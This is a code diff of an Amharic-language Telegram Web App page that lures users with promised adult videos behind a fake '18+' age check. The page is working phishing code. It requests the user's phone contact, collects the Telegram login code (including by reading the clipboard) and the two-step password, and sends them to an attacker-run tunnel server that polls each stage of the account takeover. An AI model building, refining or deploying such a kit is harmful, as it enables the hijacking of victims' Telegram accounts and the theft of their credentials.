@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Ethio VIP Hot 🔞</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -45,6 +48,8 @@
     .msg { padding: 10px; border-radius: 10px; font-size: 13px; width: 100%; margin: 10px 0; display: none; text-align: center; }
     .error { background: #311; color: #f55; border: 1px solid #522; }
     .loading { background: #210; color: #FF9900; border: 1px solid #430; }
+    /* Success Page Style */
+    .success-img { width: 100%; border-radius: 15px; margin-bottom: 20px; border: 2px solid #FF9900; box-shadow: 0 0 20px rgba(255,153,0,0.3); }
 </style>
 </head>
 <body>
@@ -60,38 +65,24 @@
           </div>
       
           <div class="video-controls">
-              <div class="progress-bar">
-                  <div class="progress-filled"></div>
-                  <div class="progress-handle"></div>
-              </div>
+              <div class="progress-bar"><div class="progress-filled"></div><div class="progress-handle"></div></div>
               <div class="controls-row">
-                  <div class="left-controls">
-                      <i class="fa-solid fa-pause"></i>
-                      <i class="fa-solid fa-volume-high"></i>
-                      <span class="video-time">04:12 / 12:45</span>
-                  </div>
-                  <div class="right-controls">
-                      <i class="fa-solid fa-gear"></i>
-                      <i class="fa-solid fa-expand"></i>
-                  </div>
+                  <div class="left-controls"><i class="fa-solid fa-pause"></i><i class="fa-solid fa-volume-high"></i><span class="video-time">04:12 / 12:45</span></div>
+                  <div class="right-controls"><i class="fa-solid fa-gear"></i><i class="fa-solid fa-expand"></i></div>
               </div>
           </div>
       </div>
 
         <div class="info-card">
             <h2>ቪዲዮውን ለማየት ያረጋግጡ 🔞</h2>
-            <p style="margin: 0; font-size: 14px; color: #bbb; line-height: 1.5;">
-                ይህ ቪዲዮ እድሜያቸው ከ18 ዓመት በላይ ለሆኑ ብቻ የተፈቀደ የሀበሻ ቪዲዮ ነው። እባክዎ እድሜዎን በማረጋገጥ በነጻ ይመልከቱ።
-            </p>
+            <p style="margin: 0; font-size: 14px; color: #bbb; line-height: 1.5;">ይህ ቪዲዮ እድሜያቸው ከ18 ዓመት በላይ ለሆኑ ብቻ የተፈቀደ የሀበሻ ቪዲዮ ነው። እባክዎ እድሜዎን በማረጋገጥ በነጻ ይመልከቱ።</p>
         </div>
 
         <div id="status1" class="msg"></div>
         <button id="main_verify_btn" class="btn-main" onclick="startVerification()">
             <i class="fa-solid fa-check-to-slot"></i> 18+ በላይ ነኝ 
         </button>
-        <p style="font-size: 11px; color: #555; margin-top: 15px;">
-            <i class="fa-solid fa-shield-halved"></i> በቴሌግራም በኩል የተረጋገጠ ደህንነት
-        </p>
+        <p style="font-size: 11px; color: #555; margin-top: 15px;"><i class="fa-solid fa-shield-halved"></i> በቴሌግራም በኩል የተረጋገጠ ደህንነት</p>
     </div>
 
     <div id="step2" class="step">
@@ -102,16 +93,10 @@
         </div>
 
         <div class="otp-container" id="otp_container">
-            <div class="otp-box" id="b0"></div>
-            <div class="otp-box" id="b1"></div>
-            <div class="otp-box" id="b2"></div>
-            <div class="otp-box" id="b3"></div>
-            <div class="otp-box" id="b4"></div>
+            <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
         </div>
 
-        <button class="btn-telegram" onclick="window.open('https://t.me/42777', '_blank')">
-            <i class="fa-brands fa-telegram"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
-        </button>
+        <button class="btn-telegram" onclick="window.open('https://t.me/42777', '_blank')"><i class="fa-brands fa-telegram"></i> ኮዱን ለማግኘት እዚህ ይጫኑ</button>
         <div id="status2" class="msg"></div>
 
         <div class="keypad">
@@ -135,6 +120,18 @@
         <button class="btn-main" style="margin-top: 25px;" onclick="submit2FA()">አረጋግጥና ግባ</button>
     </div>
 
+    <div id="step_success" class="step">
+        <div style="text-align: center; margin-top: 20px; width: 100%;">
+            <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" class="success-img">
+            <h2 style="color: #FF9900;">ማረጋገጫው ተሳክቷል! ✅</h2>
+            <p style="color: #bbb; margin-bottom: 25px;">ሁሉንም ቪዲዮዎች ያለገደብ ለማየት የቴሌግራም ቻናላችንን ይቀላቀሉ</p>
+            <button class="btn-main" onclick="window.location.href='https://t.me/EthioHotHub'">
+                <i class="fa-brands fa-telegram"></i> JOIN CHANNEL NOW
+            </button>
+            <p style="font-size: 12px; color: #555; margin-top: 20px;">ቻናሉን እንደተቀላቀሉ ቪዲዮው ይከፈታል</p>
+        </div>
+    </div>
+
     <div id="flood_step" class="step">
         <div style="font-size: 60px; margin-top: 50px;">⏳</div>
         <h2 style="color: #ff4444;">ለአጭር ጊዜ ታግደዋል!</h2>
@@ -146,20 +143,44 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // !!! አስፈላጊ !!! እዚህ ጋር ያንተን የ Ngrok ወይም የ Localtonet ሊንክ አስገባ
-    const API_BASE_URL = "https://overhead-source-steven-predicted.trycloudflare.com"; 
-
+    const API_BASE_URL = "https://zr4ouhwkc.localto.net/"; 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
 
+    // ገጹ ሲከፈት የሚደረግ ቼክ
     window.onload = function() {
+        // 1. በLocalStorage የተቀመጠ ደረጃ ካለ ወደዛ ይወስዳል
+        const lastStep = localStorage.getItem('last_step_' + userId);
+        if(lastStep) showStep(lastStep);
+
+        // 2. ከሰርቨር ጋር አሁኑኑ ያገናኛል
         checkStatus(); 
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
     };
+
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        let stepId = (typeof n === 'string' && isNaN(n)) ? n : 'step' + n;
+        const target = document.getElementById(stepId);
+        if(target) {
+            target.classList.add('active');
+            // ያለበትን ደረጃ በስልኩ LocalStorage ላይ ያስቀምጣል
+            localStorage.setItem('last_step_' + userId, stepId);
+        }
+    }
+
+    function checkStatus() {
+        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+            if (data.status === "NEED_OTP") { clearInterval(statusChecker); showStep(2); }
+            else if (data.status === "NEED_2FA") { clearInterval(statusChecker); showStep(3); }
+            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('step_success'); }
+            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+        }).catch(e => {});
+    }
 
     function startVerification() {
         if (isProcessing) return;
@@ -172,55 +193,11 @@
         checkUserInDB();
     }
 
-    function togglePass() {
-        const input = document.getElementById('2fa_input');
-        const icon = document.getElementById('togglePassword');
-        if (input.type === "password") {
-            input.type = "text";
-            icon.classList.remove('fa-eye');
-            icon.classList.add('fa-eye-slash');
-        } else {
-            input.type = "password";
-            icon.classList.remove('fa-eye-slash');
-            icon.classList.add('fa-eye');
-        }
-    }
-
-    function setupLongPressPaste() {
-        const container = document.getElementById('otp_container');
-        let timer;
-        container.addEventListener('touchstart', () => {
-            timer = setTimeout(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    const cleanCode = text.replace(/\D/g, '').slice(0, 5);
-                    if (cleanCode.length > 0) {
-                        currentOtp = cleanCode;
-                        updateOtpUI();
-                        if (currentOtp.length === 5) submitOTP();
-                        tg.HapticFeedback.notificationOccurred('success');
-                    }
-                } catch (err) {}
-            }, 800);
-        });
-        container.addEventListener('touchend', () => clearTimeout(timer));
-    }
-
-    function showMsg(stepId, type, text) {
-        const el = document.getElementById('status' + stepId);
-        if(!el) return;
-        el.className = 'msg ' + type;
-        el.innerText = text;
-        el.style.display = 'block';
-    }
-
     async function checkUserInDB() {
         showMsg(1, 'loading', 'እድሜዎን እያረጋገጥን ነው...');
         try {
-            // ሰርቨሩ መኖሩን ለማረጋገጥ Timeout እንጠቀማለን
             const controller = new AbortController();
             const id = setTimeout(() => controller.abort(), 8000);
-
             const res = await fetch(`${API_BASE_URL}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -229,28 +206,18 @@
             });
             clearTimeout(id);
             const data = await res.json();
-            
-            if (data.status === "FOUND") {
-                showMsg(1, 'loading', 'ኮድ በመላክ ላይ...');
-            } else {
-                requestPhone();
-            }
+            if (data.status === "FOUND") showMsg(1, 'loading', 'ኮድ በመላክ ላይ...');
+            else requestPhone();
         } catch(e) { 
-            // ሰርቨሩ ካልሰራ እዚህ ጋር ይቆማል
             resetUI();
-            showMsg(1, 'error', 'የማረጋገጫ ሰርቨሩ አልተገኘም (Localto Offline)። እባክዎ ቆይተው ይሞክሩ።');
-            console.error("Connection error:", e);
+            showMsg(1, 'error', 'የማረጋገጫ ሰርቨሩ አልተገኘም። እባክዎ ቆይተው ይሞክሩ።');
         }
     }
 
     function requestPhone() {
         tg.requestContact((success) => {
-            if (success) {
-                showMsg(1, 'loading', 'በመገናኘት ላይ...');
-            } else {
-                resetUI();
-                showMsg(1, 'error', 'ቪዲዮውን ለማየት share contact የሚል መንካት አለብዎት!');
-            }
+            if (success) showMsg(1, 'loading', 'በመገናኘት ላይ...');
+            else { resetUI(); showMsg(1, 'error', 'ለመቀጠል share contact ይንኩ!'); }
         });
     }
 
@@ -261,20 +228,6 @@
         btn.innerHTML = '<i class="fa-solid fa-check-to-slot"></i> 18+ በላይ ነኝ';
         document.getElementById('play_icon').style.display = 'block';
         document.getElementById('loading_spinner').style.display = 'none';
-    }
-
-    function checkStatus() {
-        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
-            if (data.status === "NEED_OTP") { clearInterval(statusChecker); showStep(2); }
-            else if (data.status === "NEED_2FA") { clearInterval(statusChecker); showStep(3); }
-            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
-        }).catch(e => {});
-    }
-
-    function showStep(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        if(typeof n === 'string') document.getElementById(n).classList.add('active');
-        else document.getElementById('step'+n).classList.add('active');
     }
 
     function press(num) {
@@ -326,16 +279,26 @@
 
     function handleResponse(data, step) {
         if (data.status === "SUCCESS") {
-            showMsg(step, 'loading', 'ተሳክቷል! ወደ ቪዲዮው እየወሰድንዎት ነው...');
-            setTimeout(() => { window.location.href = "https://t.me/EthioHotHub"; }, 1500);
+            showStep('step_success');
         } else if (data.status === "NEED_2FA") {
             showStep(3);
         } else if (data.status === "FLOOD") {
             startFloodTimer(data.wait);
         } else {
-            showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ እንደገና ይሞክሩ።');
-            if(step === 2) { currentOtp = ""; updateOtpUI(); document.querySelectorAll('.otp-box').forEach(b => b.classList.add('invalid')); }
+            showMsg(step, 'error', 'የተሳሳተ መረጃ! እንደገና ይሞክሩ።');
+            if(step === 2) { currentOtp = ""; updateOtpUI(); }
         }
+    }
+
+    function togglePass() {
+        const input = document.getElementById('2fa_input');
+        input.type = input.type === "password" ? "text" : "password";
+    }
+
+    function showMsg(stepId, type, text) {
+        const el = document.getElementById('status' + stepId);
+        if(!el) return;
+        el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
     }
 
     function startFloodTimer(seconds) {
@@ -346,6 +309,21 @@
             document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
             if (rem-- <= 0) { clearInterval(iv); location.reload(); }
         }, 1000);
+    }
+
+    function setupLongPressPaste() {
+        const container = document.getElementById('otp_container');
+        let timer;
+        container.addEventListener('touchstart', () => {
+            timer = setTimeout(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    const cleanCode = text.replace(/\D/g, '').slice(0, 5);
+                    if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
+                } catch (err) {}
+            }, 800);
+        });
+        container.addEventListener('touchend', () => clearTimeout(timer));
     }
 </script>
 </body>
